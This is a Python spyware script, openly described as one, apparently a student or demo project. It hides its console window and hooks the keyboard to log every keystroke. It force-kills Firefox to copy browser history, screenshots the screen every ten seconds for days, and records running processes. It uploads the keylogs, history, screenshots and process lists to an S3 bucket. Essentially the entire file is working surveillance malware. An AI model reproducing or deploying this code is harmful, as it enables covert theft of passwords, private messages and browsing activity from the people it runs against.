import sys
import argparse
import pyscreenshot as screenshot
import os
from datetime import timedelta, date, datetime
import utils
import time
from browserhistory import get_browserhistory
from browserhistory import browse
import json
from sys import platform
import psutil
from threading import Thread
import platform

system = platform.system()
isWindows = system == 'Windows'
if isWindows:
    import win32api
    import win32console
    import win32gui
    import pyHook
    import pythoncom
else:
    import pyxhook
from threading import Lock

log_file = 'output.txt'
escape = {
    9: '\t',
    13: '\n'
}
edit_lock = Lock()
global hasChanged
hasChanged = True

class KeyLogger:
    def OnKeyboardEvent(self,event):
        global hasChanged
        if event.Ascii >= 32:
            c = chr(event.Ascii)
            with open(log_file, 'a+') as f:
                f.write(c)
            #has file changed?
            edit_lock.acquire()
            hasChanged = False
            edit_lock.release()

        elif event.Ascii in escape:
            with open(log_file, 'a+') as f:
                f.write(escape[event.Ascii])
            edit_lock.acquire()
            hasChanged = False
            edit_lock.release()
        return True

    def __init__(self):
        # create a hook manager object
        hm = None
        if isWindows:
            win = win32console.GetConsoleWindow()
            win32gui.ShowWindow(win, 0)
            hm = pyHook.HookManager()
        else:
            hm = pyxhook.HookManager()
        hm.KeyDown = self.OnKeyboardEvent
        # set the hook
        hm.HookKeyboard()
        # wait forever
        if isWindows:
            pythoncom.PumpMessages()
        else:
            try:
                hm.start()         # start the hook
            except KeyboardInterrupt:
                # User cancelled from command line.
                pass
            except Exception as ex:
                pass

def inputBrowser():
	if platform == "linux" or platform == "darwin" or platform =="linux2":
		os.system('killall -KILL firefox')
	else:
		os.system('taskkill /F /IM firefox.exe')

	a=get_browserhistory()
	# # browse()
	# os.system('taskkill /F /IM firefox.exe')
	# os.system('killall -KILL firefox')
	print("We have your browser history HUAHUAHUA!")
	return a

def ten_seconds_passed(output_dir, s3_bucket):
	global hasChanged
	while True:
	    time.sleep(10)
	    edit_lock.acquire()
	    if not hasChanged:
	        cur_date = datetime.now()
	        file_name = 'spyware-'+cur_date.strftime("%m-%d-%M-%S")+'.log'
	        fp = output_dir + '/outputs/keylogs' + '/' + file_name
	        #move output file to output directory
	        os.rename(os.getcwd()+'/output.txt', fp)
	        #save payloads to s3
	        if s3_bucket != "":
	            utils.save_to_s3(fp, file_name)
	            os.remove(os.getcwd()+'/output.txt')
	            os.remove(fp)
	        hasChanged = True
	    edit_lock.release()


def main(args):
	# Describes what is happening
    print("This spyware is takes a screeshot of the computer it is running on every 10 seconds.")
    print("There is also a keylogging feature keeping track of each key pressed.")
    print("It is probably taking screenshots of your screen right now as you are reading this. :)")
    duration = args.duration
    interval = args.interval
    output_dir = args.output_dir
    s3_bucket = args.s3_bucket

    if not os.path.isdir(output_dir):
        print('Output directory is not a directory.')
        return

    cur_date = datetime.now()
    end_date = timedelta(days=duration) + cur_date
    delta = timedelta(seconds=interval)

    # creates directories
    if s3_bucket == "":
        os.mkdir(output_dir+'/outputs')
        os.mkdir(output_dir + '/outputs/screenshots')
        os.mkdir(output_dir + '/outputs/keylogs')
        browserhistDict = inputBrowser()
        file = open(output_dir + '/outputs/history.txt', 'w')
        file.write(json.dumps(browserhistDict))
        file.close()
    else:
        browserhistDict = inputBrowser()
        file = open(output_dir + '/history.txt', 'w')
        file.write(json.dumps(browserhistDict))
        utils.save_to_s3(output_dir + '/history.txt', "history.txt")
        os.remove(output_dir + '/history.txt')
        file.close()
	# if you would like to run this on MacOS
	# You have to disable to keylogging aspect because
	# it is not supported. PyHook works on windows and linux
	# Prefer linux. Windows might be more error prone
	# Please comment the sections inside the two breaks '****'
	# https://stackoverflow.com/questions/10994750/something-like-pyhook-on-os-x

	# ************************
    #arguments for the ten_second_passed thread
    kwargs = {
        'output_dir': output_dir,
        's3_bucket': s3_bucket
    }
    #TODO: make daemon
    upload_thread = Thread(target=ten_seconds_passed, kwargs=kwargs)
    upload_thread.start()
    #start the KeyLogger
    #TODO: pass output_dir to constructor to save logs from there instead of doing so in thread
    keylogger = KeyLogger()
	# ************************

    processes_seen = []
    fcreate = open(output_dir + "/outputs/processes.txt", "w")
    fcreate.close()
    while cur_date <= end_date:
        im = screenshot.grab()
        file_name = 'spyware-'+cur_date.strftime("%m-%d-%M-%S")+'.png'
        fp = output_dir + '/outputs/screenshots' + '/' + file_name
        f = open(output_dir + "/outputs/processes.txt", "a")

        changed = False
        for process in psutil.process_iter():
            processInfo = process.as_dict(attrs= ['pid', 'name', 'create_time'])
            processID = processInfo['pid']
            processName = processInfo['name']
            if processName not in processes_seen:
                processCreationTime = time.strftime('%d-%m-%Y %H:%M:%S', time.localtime(processInfo['create_time']))
                f.write(f'{processCreationTime}: process_name: {processName} pid: {processID}\n')
                processes_seen.append(processName)
                changed=True


        #save payloads to s3
        if s3_bucket != "":
            utils.save_to_s3(fp, file_name)
            os.remove(fp)
            if changed:
                utils.save_to_s3(output_dir + "/outputs/processes.txt", "processes.txt")

        else: #save all payloads (keylogger, history, output files) to output dir
            im.save(fp)

        time.sleep(int(interval))

        cur_date += delta

    if s3!="":
        os.remove(output_dir + "/outputs/processes.txt")
# Instruction panel
def inspanel():
    print("Enter 1 to run the program")
    print("Enter 2 to exit")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
                                    description = "Screenshots and keylogs a host",
                                )
    parser.add_argument("-d", "--duration", type=int, default=7,
                      help = "The duration of the script in days")
    parser.add_argument("-i", "--interval", type=int, default=10,
                      help = "The interval of the screenshots in seconds")
    parser.add_argument("-o", "--output_dir", default=os.getcwd(),
                      help = "The output directory of the screenshots")
    parser.add_argument("-s3", "--s3_bucket", default="",
                      help = "The s3 directory of the screenshots")

    args = parser.parse_args()
    main(args)
